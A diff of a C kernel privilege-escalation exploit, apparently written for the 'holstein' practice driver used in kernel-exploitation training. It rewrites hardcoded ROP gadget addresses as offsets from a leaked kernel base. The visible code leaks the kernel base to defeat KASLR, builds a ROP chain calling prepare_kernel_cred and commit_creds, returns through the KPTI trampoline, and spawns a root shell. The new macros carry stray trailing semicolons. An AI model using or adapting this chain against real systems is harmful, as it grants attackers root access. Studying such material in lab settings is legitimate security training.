@@ -17,22 +17,14 @@
 
 #define DEVICE "/dev/holstein"
 #define BUFFER_SIZE 0x400/0x8
-#define NOKASRL_BASE 0xffffffff81000000
-#define HOLSTEIN_WRITE 0xffffffffc0000120
 
-// rep: This is a prefix that stands for "repeat." 
-// It tells the CPU to repeat the following instruction 
-// a number of times based on the value in the RCX register. 
-// Specifically, it decrements RCX after each iteration until it reaches zero.
+#define mov_rdi_rax_rep (kbase + 0x60c96b);
+#define pop_rdi (kbase + 0x27bbdc);
+#define pop_rcx_12_rbp (kbase + 0x2e10bb);
+#define prepare_kernel_cred (kbase + 0x06e240);
+#define commit_creds (kbase + 0x06e390);
+#define kpti_trampoline (kbase + 0x800e10 + 22); // swapgs_restore_regs_and_return_to_usermode
 unsigned long kbase;
-unsigned long mov_rdi_rax_rep = 0xffffffff8160c96b;
-unsigned long pop_rdi = 0xffffffff8127bbdc;
-unsigned long pop_rcx_12_rbp = 0xffffffff812e10bb;
-unsigned long swapgs = 0xffffffff8160bf7e;
-unsigned long iretq = 0xffffffff810202af;
-unsigned long prepare_kernel_cred = 0xffffffff8106e240;
-unsigned long commit_creds = 0xffffffff8106e390;
-unsigned long kpti_trampoline = 0xffffffff81800e10 + 22; // swapgs_restore_regs_and_return_to_usermode
 long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;
 
 void save_state() {
@@ -60,18 +52,6 @@ void spawn_shell()
     exit(0); // avoid ugly segfault
 }
 
-void rebase_gadget(unsigned long base) {
-    kbase = base;
-    mov_rdi_rax_rep = mov_rdi_rax_rep - NOKASRL_BASE + kbase;
-    pop_rdi = pop_rdi - NOKASRL_BASE + kbase;
-    pop_rcx_12_rbp = pop_rcx_12_rbp - NOKASRL_BASE + kbase;
-    swapgs = swapgs - NOKASRL_BASE + kbase;
-    iretq = iretq - NOKASRL_BASE + kbase;
-    prepare_kernel_cred = prepare_kernel_cred - NOKASRL_BASE + kbase;
-    commit_creds = commit_creds - NOKASRL_BASE + kbase;
-    kpti_trampoline = kpti_trampoline - NOKASRL_BASE + kbase;
-}
-
 int main(int argc, char *argv[]){
     setvbuf(stdout, NULL, _IONBF, 0);
     save_state();
@@ -91,7 +71,6 @@ int main(int argc, char *argv[]){
     printf("[*] debug: %#lx\n", payload[BUFFER_SIZE+0x1]);
     kbase = payload[BUFFER_SIZE+0x1] - 0x13d33c;
     printf("[+] kernel base: %#lx\n", kbase);
-    rebase_gadget(kbase);
 
     unsigned long* chain = &payload[BUFFER_SIZE+0x1];
     *chain++ = pop_rdi;
